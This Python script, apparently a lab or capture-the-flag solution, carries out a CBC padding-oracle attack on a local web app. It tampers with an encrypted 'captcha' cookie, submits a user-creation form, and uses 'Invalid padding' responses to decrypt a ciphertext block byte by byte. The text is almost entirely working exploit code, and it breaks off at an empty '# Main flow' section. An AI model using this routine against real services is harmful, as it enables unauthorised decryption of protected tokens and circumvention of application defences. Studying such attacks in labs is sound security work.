import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """Returns True if NOT "Invalid padding", False otherwise"""
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    data = {'csrf_token': csrf_token, 'username': 'test', 'captcha': '123', 'submit': 'Create User'}
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        return "Invalid padding" not in resp.text
    except:
        return None

def decrypt_block(iv, ciphertext, session, csrf_token):
    """Decrypt a single block using padding oracle"""
    IV = bytearray(iv)
    C = bytearray(ciphertext[:BLOCK_SIZE])
    INT = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)
    
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        pad_val = BLOCK_SIZE - byte_pos
        for test_val in range(256):
            test_IV = bytearray(IV)
            test_IV[byte_pos] = test_val
            for i in range(byte_pos + 1, BLOCK_SIZE):
                test_IV[i] = INT[i] ^ pad_val
            
            test_cipher = bytes(test_IV) + bytes(C)
            test_b64 = base64.b64encode(test_cipher).decode()
            
            if test_oracle(session, test_b64, csrf_token):
                INT[byte_pos] = test_val ^ pad_val
                plaintext[byte_pos] = IV[byte_pos] ^ INT[byte_pos]
                break
    
    return plaintext

# Main flow
